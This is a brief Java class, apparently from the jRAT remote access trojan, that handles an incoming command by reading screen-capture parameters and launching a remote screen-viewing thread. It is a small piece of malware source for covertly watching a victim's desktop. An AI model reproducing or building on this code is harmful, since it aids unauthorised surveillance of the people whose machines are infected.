package jrat.module.screen;

import jrat.client.Connection;
import jrat.client.packets.incoming.IncomingPacket;

public class Packet12RemoteScreen implements IncomingPacket {
	
	@Override
	public void read(Connection con) throws Exception {
		int size = con.readInt();
		int quality = con.readInt();
		int monitor = con.readInt();
		int columns = con.readInt();
		int rows = con.readInt();
		
		new Screen(con, size, quality, monitor, columns, rows).start();
	}

}
